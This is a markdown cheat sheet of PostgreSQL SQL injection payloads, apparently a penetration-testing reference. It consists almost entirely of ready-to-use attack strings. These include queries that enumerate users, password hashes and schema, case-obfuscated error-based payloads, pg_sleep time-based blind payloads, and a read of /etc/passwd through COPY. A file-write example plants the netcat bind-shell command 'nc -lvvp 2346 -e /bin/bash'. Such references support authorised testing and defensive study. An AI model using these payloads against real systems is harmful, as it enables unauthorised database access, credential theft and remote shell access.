# POSTGRESQL

## PostgreSQL Comments

```sql
--
/**/  
```

## PostgreSQL Functions

```sql
version()
current_database()
chr(65)
ascii(‘A’)
SELECT 'A'||'B'='AB'
```

## Postgresql queries

```sql
SELECT usename FROM pg_user; -- Usernames
-- SELECT usename, passwd FROM pg_shadow; -- Usernames & passwords, access could be forviden
SELECT usename, usecreatedb, usesuper, usesysid, passwd FROM pg_user; -- Permisions
SELECT datname FROM pg_database; -- databases
```

## PostgreSQLi Flow
```sql
-- List Tables
SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid)

-- List Columns
SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public')

-- List table from columns
SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') AND attname LIKE '%<COLUMN_NAME>%';
```

**MySQL like**
```sql
SELECT table_name FROM information_schema.tables limit 1 offset X;
SELECT column_name FROM information_schema.columns WHERE table_name='<TABLE_NAME>';-- Use single quotes

sEleCt string_agg(table_name,',') fRoM information_schema.tables;-- Instead of group_concat()
```

## PostgreSQL Error Based - Basic

```sql
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name=data_column+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)

(select array_to_string(array(select table_name::text from information_schema.tables where table_schema not in ($$information_schema$$,$$pg_catalog$$)),$$:$$)::int)
(select array_to_string(array(select column_name::text from information_schema.columns where table_name=$$<TABLE_NAME>$$),$$:$$)::int)
```

## PostgreSQL Time Based

```sql
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

## PostgreSQL File Read

```sql
select pg_read_file('PG_VERSION', 0, 200);
```

```sql
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp limit 1 offset 0;
```

## PostgreSQL File Write

```sql
CREATE TABLE pentestlab (t TEXT);
INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
SELECT * FROM pentestlab;
COPY pentestlab(t) TO '/tmp/pentestlab';
```

## Thanks to

* [A Penetration Tester’s Guide to PostgreSQL - David Hayter](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
* [Postgres SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
